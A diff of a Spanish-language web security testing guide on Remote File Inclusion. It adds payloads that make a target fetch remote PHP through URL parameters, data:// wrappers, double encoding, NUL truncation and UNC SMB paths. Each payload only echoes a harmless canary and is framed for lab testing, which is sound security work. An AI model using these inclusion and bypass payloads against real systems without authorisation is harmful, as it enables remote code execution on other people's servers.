@@ -8,7 +8,77 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
-## 🔬 Pruebas por escenario
+> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
+
+## 💉 Payloads básicos
+
+### URL remota en parámetros de plantilla
+
+```text
+?template=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
+?page=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
+?include=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
+```
+
+**Cuándo usarlo:** La callback confirma un fetch; RFI exige que la aplicación incluya o evalúe el contenido remoto.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).
+
+
+### Servidor propio con marcador PHP
+
+```php
+<?php echo "RFI-CANARY-{NONCE}"; ?>
+```
+
+**Cuándo usarlo:** Solo en laboratorio PHP y en un host propio. Distinguir salida calculada de reflejo del código fuente.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).
+
+
+## 🧭 Payloads por contexto
+
+### Esquemas y extensiones
+
+```text
+https://{SERVIDOR_PROPIO}/canary-{NONCE}.php
+http://{SERVIDOR_PROPIO}/canary-{NONCE}.php
+https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
+```
+
+**Cuándo usarlo:** Son alternativas HTTP: cambiar solo esquema o extensión por solicitud. El servidor propio debe entregar el código PHP como texto sin ejecutarlo; una callback o ejecución en el servidor emisor no prueba inclusión en el destino.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).
+
+
+## 🔥 Payloads avanzados
+
+### Wrapper data de PHP en sandbox
+
+```text
+data://text/plain;base64,PD9waHAgZWNobyAiUkZJLUNBTkFSWSI7Pz4=
+data://text/plain,%3C%3Fphp%20echo%20%22RFI-CANARY%22%3B%3F%3E
+```
+
+**Cuándo usarlo:** Dos codificaciones del mismo marcador PHP. Si se inserta en un parámetro URL, codificar también el valor exterior. Requiere un include PHP compatible y allow_url_include habilitado; observar RFI-CANARY ejecutado en el destino.
+
+**Fuente:** [www.php.net](https://www.php.net/manual/en/wrappers.data.php).
+
+
+### Normalización y ruta impuesta por el backend
+
+```text
+https%253A%252F%252F{SERVIDOR_PROPIO}%252Fcanary-{NONCE}.php
+https://{SERVIDOR_PROPIO}/canary-{NONCE}.php%00
+https://{SERVIDOR_PROPIO}/canary-{NONCE}.php?x=.php
+```
+
+**Cuándo usarlo:** Doble decodificación y NUL dependen del stack; comprobar en logs del servidor propio qué URL se pidió.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).
+
+
+## 🔬 Pruebas guiadas por escenario
 
 ### 1. Include HTTPS a canary propio
 
@@ -21,19 +91,19 @@ Host: {ORIGEN}
 
 **Interpretación:** Una callback externa demuestra fetch; solo se habla de RFI si el contenido entra al intérprete o plantilla.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
 
-### 2. Include HTTP a canary propio
+### 2. UNC SMB en Windows de laboratorio
 
-**Objetivo:** Distinguir allowlist de esquemas o bloqueo por TLS.
+**Objetivo:** Solo en servidor Windows con include de rutas UNC, apuntar a un share SMB propio.
 
 ```text
-http://{CONTROLLED_HOST}/canary-{NONCE}.txt
+\\{HOST_SMB_PROPIO}\share\canary-{NONCE}.php
 ```
 
-**Interpretación:** Comparar con HTTPS bajo el mismo host y contenido. Un rechazo por política no es vulnerabilidad.
+**Interpretación:** Una conexión SMB no demuestra evaluación; confirmar el marcador de PHP servido por el share y no usar rutas ajenas.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
 
 ### 3. Contenido PHP inocuo en laboratorio
 
@@ -43,21 +113,21 @@ http://{CONTROLLED_HOST}/canary-{NONCE}.txt
 <?php echo "RFI-CANARY-{NONCE}"; ?>
 ```
 
-**Interpretación:** Servirlo desde host propio solo a una app de laboratorio. El marcador calculado debe aparecer sin el código fuente.
+**Interpretación:** Servir el código PHP crudo como texto desde un host propio; si el servidor remoto lo ejecuta antes de entregarlo, el marcador no demuestra evaluación en el objetivo.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
 
 ### 4. Extensión añadida por backend
 
-**Objetivo:** Comprobar si el servidor agrega `.php` al valor.
+**Objetivo:** Solo en PHP anterior a 5.3.4, comprobar truncamiento NUL cuando la app concatena .php.
 
 ```text
 https://{CONTROLLED_HOST}/plantilla-{NONCE}%00
 ```
 
-**Interpretación:** El byte nulo solo es relevante en stacks legacy; verificar URL solicitada en el servidor propio.
+**Interpretación:** Verificar versión y URL pedida al host propio. PHP moderno rechaza NUL; un error de parser no confirma inclusión.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
 
 ### 5. Doble codificación de URL
 
@@ -69,7 +139,7 @@ https%253A%252F%252F{CONTROLLED_HOST}%252Fcanary-{NONCE}.txt
 
 **Interpretación:** Una callback tras doble decodificación indica discrepancia de parser, no necesariamente evaluación.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
 
 ### 6. Ruta local como control
 
@@ -80,21 +150,21 @@ GET /view?template={PLANTILLA_PERMITIDA} HTTP/1.1
 Host: {ORIGEN}
 ```
 
-**Interpretación:** Identificar diferencias de renderizado, tipo de respuesta y logs del host controlado.
+**Interpretación:** Identificar renderizado legítimo y tipo de respuesta; el control local no prueba ni descarta por sí solo inclusión remota.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/file-upload).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
 
-### 7. Esquema data en laboratorio
+### 7. Wrapper data en laboratorio
 
-**Objetivo:** Comprobar si un include PHP acepta wrappers remotos configurados.
+**Objetivo:** Comprobar si un include PHP permite el wrapper data con código PHP inocuo.
 
 ```text
-data:text/plain,<?php%20echo%20"RFI-CANARY-{NONCE}";%20?>
+data://text/plain;base64,{BASE64_DE_PHP_ECHO_CANARY}
 ```
 
-**Interpretación:** Requiere configuración legacy `allow_url_include`; usar solo en laboratorio, sin comandos del sistema.
+**Interpretación:** Generar el Base64 de un echo PHP propio. Requiere allow_url_include y allow_url_fopen; si se evalúa, es inclusión de código vía data, no fetch remoto.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
+**Fuente técnica:** [www.php.net](https://www.php.net/manual/en/wrappers.data.php).
 
 ## ✅ Evidencia mínima
 
